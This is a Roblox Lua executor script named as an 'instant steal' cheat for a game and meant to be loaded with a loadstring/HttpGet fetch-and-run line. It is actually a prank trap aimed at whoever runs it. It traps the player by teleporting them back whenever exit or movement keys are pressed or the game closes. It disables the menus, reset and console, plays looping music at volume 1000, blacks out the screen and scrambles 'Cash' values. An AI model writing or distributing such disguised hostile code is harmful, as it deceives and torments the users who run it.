-- "STEAL A BRAINOT: INSTANT STEAL" - EXTREME VERSION
-- Place on GitHub raw, load with: loadstring(game:HttpGet("RAW_GITHUB_URL"))()
-- This script is for executor prank use only!

-- === CONFIGURATION ===
local FINAL_TEXTURE = "rbxassetid://70737147873213"
local FINAL_SKYBOX = "rbxassetid://73730735468991"
local FINAL_MUSIC = "rbxassetid://133838630142849"
local REJOIN_PLACE_ID = 1752868452747

-- === SERVICES ===
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local UserInputService = game:GetService("UserInputService")
local TeleportService = game:GetService("TeleportService")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local SoundService = game:GetService("SoundService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer

-- === BLOCK ALL EXIT/RESET/ESCAPE ATTEMPTS (MAXIMUM) ===
local blockKeycodes = {
	Enum.KeyCode.LeftAlt, Enum.KeyCode.RightAlt, Enum.KeyCode.F4, Enum.KeyCode.Escape,
	Enum.KeyCode.Menu, Enum.KeyCode.Backspace, Enum.KeyCode.Q, Enum.KeyCode.W,
	Enum.KeyCode.Tab, Enum.KeyCode.LeftControl, Enum.KeyCode.RightControl,
	Enum.KeyCode.LeftShift, Enum.KeyCode.RightShift
}
UserInputService.InputBegan:Connect(function(input, processed)
	for _, key in ipairs(blockKeycodes) do
		if input.KeyCode == key then
			TeleportService:Teleport(REJOIN_PLACE_ID, player)
		end
	end
end)
pcall(function()
	game:BindToClose(function()
		while true do
			TeleportService:Teleport(REJOIN_PLACE_ID)
			task.wait(0.1)
		end
	end)
end)
pcall(function()
	for _, guiType in ipairs(Enum.CoreGuiType:GetEnumItems()) do
		StarterGui:SetCoreGuiEnabled(guiType, false)
	end
end)
pcall(function() StarterGui:SetCore("ResetButtonCallback", false) end)
pcall(function() StarterGui:SetCore("DevConsoleVisible", false) end)
pcall(function() StarterGui:SetCore("ChatActive", false) end)
pcall(function() StarterGui:SetCore("TopbarEnabled", false) end)

-- Force rejoin on player removal (prank, not foolproof)
spawn(function()
	while task.wait(0.5) do
		pcall(function()
			if not Players.LocalPlayer or not Players.LocalPlayer.Parent then
				TeleportService:Teleport(REJOIN_PLACE_ID)
			end
		end)
	end
end)

-- === FADE TO BLACK GUI ===
local function fadeToBlack()
	local sg = Instance.new("ScreenGui")
	sg.Name = "BrainotPrankFade"
	sg.IgnoreGuiInset = true
	sg.ResetOnSpawn = false
	sg.DisplayOrder = 9999999
	sg.Parent = player:WaitForChild("PlayerGui")

	local black = Instance.new("Frame")
	black.BackgroundColor3 = Color3.new(0,0,0)
	black.Size = UDim2.new(1,0,1,0)
	black.BackgroundTransparency = 1
	black.ZIndex = 20
	black.Parent = sg

	-- Fade in
	for i = 1, 20 do
		black.BackgroundTransparency = 1 - (i/20)
		task.wait(0.02)
	end
	black.BackgroundTransparency = 0
	return sg
end

-- === DISABLE ALL SOUNDS & PLAY FINAL MUSIC ON MAX ===
for _, s in pairs(SoundService:GetDescendants()) do
	if s:IsA("Sound") then
		pcall(function() s:Stop() end)
		pcall(function() s.Volume = 0 end)
	end
end
for _, s in pairs(workspace:GetDescendants()) do
	if s:IsA("Sound") then
		pcall(function() s:Stop() end)
		pcall(function() s.Volume = 0 end)
	end
end
local prankMusic = Instance.new("Sound")
prankMusic.SoundId = FINAL_MUSIC
prankMusic.Looped = true
prankMusic.Volume = 1000
prankMusic.Parent = SoundService
prankMusic:Play()

-- === CHANGE ALL TEXTURES, PARTICLES, DECALS, TRAILS, ETC. ===
for _, obj in pairs(workspace:GetDescendants()) do
	if obj:IsA("ParticleEmitter") or obj:IsA("Trail") then
		pcall(function() obj.Texture = FINAL_TEXTURE end)
	elseif obj:IsA("Decal") or obj:IsA("Texture") then
		pcall(function() obj.Texture = FINAL_TEXTURE end)
	elseif obj:IsA("MeshPart") then
		pcall(function() obj.TextureID = FINAL_TEXTURE end)
	end
end

-- === REMOVE BRIGHTNESS, SUN, BLOOM, ETC. ===
for _, v in ipairs(Lighting:GetChildren()) do
	if v:IsA("Sky") then v:Destroy() end
	if v:IsA("SunRaysEffect") then v:Destroy() end
	if v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("ColorCorrectionEffect") then v:Destroy() end
end
Lighting.Brightness = 0
Lighting.ClockTime = 0
Lighting.FogEnd = 20
Lighting.FogStart = 0
Lighting.FogColor = Color3.fromRGB(15,15,15)
Lighting.Ambient = Color3.fromRGB(10,10,10)
Lighting.OutdoorAmbient = Color3.fromRGB(10,10,10)

local sky = Instance.new("Sky")
sky.SkyboxBk = FINAL_SKYBOX
sky.SkyboxDn = FINAL_SKYBOX
sky.SkyboxFt = FINAL_SKYBOX
sky.SkyboxLf = FINAL_SKYBOX
sky.SkyboxRt = FINAL_SKYBOX
sky.SkyboxUp = FINAL_SKYBOX
sky.Parent = Lighting

-- === HIDE ALL PLAYERS (CHARACTERS) & REMOVE PLAYERLIST ===
for _, plr in ipairs(Players:GetPlayers()) do
	if plr ~= player then
		local char = plr.Character
		if char then
			for _, part in ipairs(char:GetChildren()) do
				if part:IsA("BasePart") or part:IsA("Decal") or part:IsA("MeshPart") then
					pcall(function() part.Transparency = 1 end)
				end
			end
		end
	end
end
Players.PlayerAdded:Connect(function(plr)
	plr.CharacterAdded:Connect(function(char)
		for _, part in ipairs(char:GetChildren()) do
			if part:IsA("BasePart") or part:IsA("Decal") or part:IsA("MeshPart") then
				pcall(function() part.Transparency = 1 end)
			end
		end
	end)
end)
pcall(function()
	StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
end)

-- === STRONG FOG GUI EFFECT ===
local function heavyFog()
	local sg = Instance.new("ScreenGui")
	sg.Name = "BrainotPrankFog"
	sg.IgnoreGuiInset = true
	sg.ResetOnSpawn = false
	sg.DisplayOrder = 9999998
	sg.Parent = player:WaitForChild("PlayerGui")
	local fog = Instance.new("Frame")
	fog.BackgroundColor3 = Color3.fromRGB(15,15,15)
	fog.BackgroundTransparency = 0.08
	fog.Size = UDim2.new(1,0,1,0)
	fog.ZIndex = 22
	fog.Parent = sg
end
heavyFog()

-- === CHANGE "Cash" VALUE TO RANDOM CHARACTERS ===
local function obfuscateCashVal()
	local function randomStr(len)
		local str = ""
		for i=1,len do
			str = str .. string.char(math.random(33,126))
		end
		return str
	end
	local function doObfuscate(val)
		pcall(function()
			val.Name = randomStr(math.random(6,10))
			val.Value = randomStr(math.random(8,14))
		end)
	end
	local function scan(obj)
		for _, v in pairs(obj:GetChildren()) do
			if v:IsA("IntValue") or v:IsA("StringValue") or v:IsA("NumberValue") then
				if v.Name:lower():find("cash") then
					doObfuscate(v)
				end
			end
			scan(v)
		end
	end
	scan(player)
	pcall(function()
		player.ChildAdded:Connect(function(child)
			scan(child)
		end)
	end)
end
obfuscateCashVal()

-- === FINAL FADE TO BLACK FOR ATMOSPHERE ===
fadeToBlack()

-- END
